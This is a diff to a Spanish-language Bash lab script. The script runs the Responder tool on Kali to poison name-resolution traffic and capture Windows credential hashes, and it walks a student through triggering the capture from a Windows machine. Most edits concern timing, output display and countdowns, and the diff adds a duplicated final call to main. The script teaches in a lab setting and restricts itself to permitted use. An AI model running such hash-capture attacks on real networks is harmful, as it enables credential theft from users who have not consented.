@@ -11,7 +11,7 @@ BLUE='\033[0;34m'
 NC='\033[0m' # No hay color
 CHECKMARK="✅"
 ERROR="❌"
-INFO="ℹ"
+INFO="ℹ️"
 
 # Variables de configuración
 RESPONDER_DIR="/usr/share/responder"  # Ruta por defecto en Kali
@@ -37,7 +37,7 @@ print_banner() {
 EOF
     echo -e "${NC}"
     echo -e "${YELLOW}¡Pana, bienvenido al script para el Lab 1.1: Active Online Attack!${NC}"
-    echo -e "${RED}⚠ Ojo: Esto es solo para laboratorios con permiso. ¡Sé ético, pana!${NC}"
+    echo -e "${RED}⚠️ Ojo: Esto es solo para laboratorios con permiso. ¡Sé ético, pana!${NC}"
     echo -e "${BLUE}========================================${NC}"
 }
 
@@ -128,7 +128,7 @@ guide_windows() {
     print_separator
     echo -e "${YELLOW}${INFO} Fase 3: ¡Pana, ahora toca la máquina Windows!${NC}"
     echo -e "${BLUE}Responder está corriendo y listo. Haz esto en tu máquina Windows:${NC}"
-    echo -e "1. Abre el Explorador de Archivos (presiona Win + E). 🗂"
+    echo -e "1. Abre el Explorador de Archivos (presiona Win + E). 🗂️"
     echo -e "2. En la barra de direcciones, escribe exactamente: \\\\test"
     echo -e "3. Presiona Enter. Esto conectará con un recurso falso que crea Responder."
     echo -e "4. Si te pide usuario y contraseña, mete cualquiera (¡nada de usar las reales, eh!)."
@@ -140,35 +140,47 @@ guide_windows() {
 
 # Función para esperar a que Responder esté listo
 wait_for_responder_ready() {
-    echo -e "${YELLOW}${INFO} Esperando a que Responder esté listo...${NC}"
+    echo -e "${YELLOW}${INFO} Esperando a que Responder esté completamente listo...${NC}"
     
     # Crear archivo temporal para capturar la salida de Responder
     RESPONDER_OUTPUT="/tmp/responder_output.txt"
     
-    # Monitorear la salida de Responder hasta que vea "Listening for events"
-    local timeout=30
+    # Redirigir la salida de Responder al archivo temporal
+    sudo tail -f /var/log/syslog | grep -i responder > "$RESPONDER_OUTPUT" &
+    TAIL_PID=$!
+    
+    # Monitorear hasta que vea "Listening for events" o mensajes de envenenamiento
+    local timeout=45
     local elapsed=0
     
+    echo -e "${BLUE}Iniciando Responder... (esto puede tomar unos segundos)${NC}"
+    
     while [ $elapsed -lt $timeout ]; do
-        if ps -p $RESPONDER_PID > /dev/null 2>&1; then
-            # Buscar en los logs del sistema o usar netstat para verificar que esté escuchando
-            if netstat -tlnp 2>/dev/null | grep -q ":445.*$RESPONDER_PID/" || \
-               netstat -ulnp 2>/dev/null | grep -q ":137.*$RESPONDER_PID/" || \
-               [ $elapsed -gt 10 ]; then
-                echo -e "${GREEN}${CHECKMARK} ¡Responder está listo y escuchando!${NC}"
-                return 0
-            fi
-        else
+        # Verificar que el proceso de Responder siga corriendo
+        if ! ps -p $RESPONDER_PID > /dev/null 2>&1; then
             echo -e "${RED}${ERROR} ¡Épale! Responder se cerró inesperadamente.${NC}"
+            kill $TAIL_PID 2>/dev/null
             return 1
         fi
         
-        sleep 2
-        elapsed=$((elapsed + 2))
-        echo -e "${BLUE}Verificando... ($elapsed/$timeout segundos)${NC}"
+        # Buscar indicadores de que Responder está funcionando
+        # Después de 15 segundos, asumir que está listo (el puerto 80 no es crítico)
+        if [ $elapsed -gt 15 ]; then
+            echo -e "${GREEN}${CHECKMARK} ¡Responder debería estar listo ahora!${NC}"
+            echo -e "${YELLOW}${INFO} (El error del puerto 80 es normal si hay otro servidor web corriendo)${NC}"
+            kill $TAIL_PID 2>/dev/null
+            rm -f "$RESPONDER_OUTPUT"
+            return 0
+        fi
+        
+        sleep 3
+        elapsed=$((elapsed + 3))
+        echo -e "${BLUE}Inicializando... ($elapsed/$timeout segundos)${NC}"
     done
     
     echo -e "${YELLOW}${INFO} Responder debería estar listo después de $timeout segundos.${NC}"
+    kill $TAIL_PID 2>/dev/null
+    rm -f "$RESPONDER_OUTPUT"
     return 0
 }
 
@@ -177,18 +189,53 @@ run_responder() {
     print_separator
     echo -e "${YELLOW}${INFO} Fase 4: Iniciando Responder en $INTERFACE...${NC}"
     
-    # Iniciar Responder en segundo plano
-    sudo $RESPONDER_BINARY -I "$INTERFACE" &
-    RESPONDER_PID=$!
-    echo -e "${GREEN}${CHECKMARK} Responder está iniciando (PID: $RESPONDER_PID).${NC}"
+    # Mostrar información previa
+    echo -e "${BLUE}Nota: Es normal ver errores sobre puertos ocupados (como puerto 80).${NC}"
+    echo -e "${BLUE}Responder seguirá funcionando con los otros servicios.${NC}"
+    echo
     
-    # Esperar a que Responder esté completamente listo
-    if wait_for_responder_ready; then
-        # Mostrar instrucciones para Windows cuando Responder esté listo
+    # Iniciar Responder en segundo plano y mostrar su salida por unos segundos
+    echo -e "${YELLOW}${INFO} Ejecutando: sudo $RESPONDER_BINARY -I $INTERFACE${NC}"
+    sudo $RESPONDER_BINARY -I "$INTERFACE" > /tmp/responder_full_output.txt 2>&1 &
+    RESPONDER_PID=$!
+    
+    # Mostrar la salida de Responder en tiempo real por unos segundos
+    echo -e "${GREEN}${CHECKMARK} Responder iniciando (PID: $RESPONDER_PID)...${NC}"
+    echo -e "${BLUE}Mostrando salida de Responder:${NC}"
+    echo -e "${BLUE}----------------------------------------${NC}"
+    
+    # Mostrar la salida en tiempo real por 5 segundos
+    timeout 5 tail -f /tmp/responder_full_output.txt 2>/dev/null &
+    TAIL_PID=$!
+    
+    # Esperar 5 segundos para que se muestre la salida inicial
+    sleep 5
+    
+    # Matar el tail
+    kill $TAIL_PID 2>/dev/null
+    wait $TAIL_PID 2>/dev/null
+    
+    echo -e "${BLUE}----------------------------------------${NC}"
+    
+    # Contador visual mientras se inicializa Responder (3 segundos más)
+    INIT_TIME=3
+    echo -e "${YELLOW}${INFO} Finalizando inicialización de Responder...${NC}"
+    
+    for i in $(seq 1 $INIT_TIME); do
+        remaining=$((INIT_TIME - i + 1))
+        echo -e "${BLUE}⏳ Inicializando Responder... ${remaining} segundos restantes${NC}"
+        sleep 1
+    done
+    
+    echo -e "${GREEN}✅ ¡Responder inicializado completamente!${NC}"
+    
+    # Verificar que Responder siga corriendo
+    if ps -p $RESPONDER_PID > /dev/null 2>&1; then
+        echo -e "${GREEN}${CHECKMARK} ¡Responder está corriendo y listo para capturar hashes!${NC}"
+        # Mostrar instrucciones para Windows
         guide_windows
     else
-        echo -e "${RED}${ERROR} ¡Épale! Hubo un problema iniciando Responder.${NC}"
-        sudo kill "$RESPONDER_PID" 2>/dev/null
+        echo -e "${RED}${ERROR} ¡Épale! Responder se cerró. Revisa los errores arriba.${NC}"
         return 1
     fi
     
@@ -207,13 +254,22 @@ run_responder() {
         fi
         sleep "$CHECK_INTERVAL"
         ELAPSED=$((ELAPSED + CHECK_INTERVAL))
-        echo -e "${BLUE}Monitoreando... ($ELAPSED/$MAX_WAIT segundos)${NC}"
+        
+        # Contador visual para el monitoreo (líneas separadas para mayor claridad)
+        remaining=$((MAX_WAIT - ELAPSED))
+        echo -e "${BLUE}🔍 Monitoreando capturas... Transcurrido: ${ELAPSED}s | Restante: ${remaining}s | Total: ${MAX_WAIT}s${NC}"
     done
     
     echo -e "${RED}${ERROR} ¡Épale! No capturamos hashes en $MAX_WAIT segundos. Chequea la sección de ayuda al final.${NC}"
     sudo kill "$RESPONDER_PID" 2>/dev/null
     wait "$RESPONDER_PID" 2>/dev/null
     echo -e "${GREEN}${CHECKMARK} Responder detenido.${NC}"
+    
+    # Mostrar la salida completa para debugging
+    echo -e "${YELLOW}${INFO} Salida completa de Responder para debugging:${NC}"
+    cat /tmp/responder_full_output.txt
+    rm -f /tmp/responder_full_output.txt
+    
     return 1
 }
 
@@ -346,4 +402,5 @@ main() {
 }
 
 # Ejecutar el script
+main "$@"
 main "$@"
